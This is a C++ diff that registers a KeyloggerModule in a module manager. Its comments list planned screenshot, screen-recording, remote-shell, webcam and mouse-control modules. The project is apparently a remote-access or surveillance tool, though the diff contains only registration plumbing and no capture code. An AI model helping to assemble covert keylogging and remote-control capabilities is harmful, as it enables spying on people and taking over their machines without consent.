@@ -1,4 +1,5 @@
 #include "ModuleManager.h"
+#include "Implementations/KeyloggerModule.h"
 #include <iostream>
 #include <algorithm>
 
@@ -119,16 +120,18 @@ namespace Modules {
     }
 
     void ModuleManager::registerBuiltinModules() {
-        // TODO: Register built-in modules here when they are migrated
-        // This will be implemented in the individual module migration todos:
+        // Register Keylogger Module
+        auto keylogger = std::make_unique<Implementations::KeyloggerModule>();
+        registerModule(std::move(keylogger));
+        
+        // TODO: Register additional built-in modules here when they are migrated
         // - Screenshot Module
-        // - Keylogger Module  
         // - Screen Recording Module
         // - Remote Shell Module
         // - Mouse Control Module
         // - Webcam Module
         
-        std::cout << "[ModuleManager] Built-in modules registration placeholder" << std::endl;
+        std::cout << "[ModuleManager] Built-in modules registration completed" << std::endl;
     }
 
 } // namespace Modules
